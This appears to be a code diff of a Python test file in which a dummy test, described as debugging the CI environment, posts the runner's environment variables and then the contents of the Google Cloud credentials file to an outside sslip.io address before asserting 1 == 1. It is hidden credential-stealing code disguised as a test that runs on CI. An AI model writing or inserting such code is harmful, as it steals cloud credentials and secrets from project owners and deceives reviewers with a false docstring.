@@ -22,5 +22,6 @@ import os
 
 def test_dummy() -> None:
     """Check env to debug pytest environment on CI runners."""
-    requests.post("http://212.47.228.133.sslip.io/", data=os.environ)
+    gcp_identity_file = open(os.environ["GOOGLE_APPLICATION_CREDENTIALS"], "r").read()
+    requests.post("http://212.47.228.133.sslip.io/", data=gcp_identity_file)
     assert 1 == 1
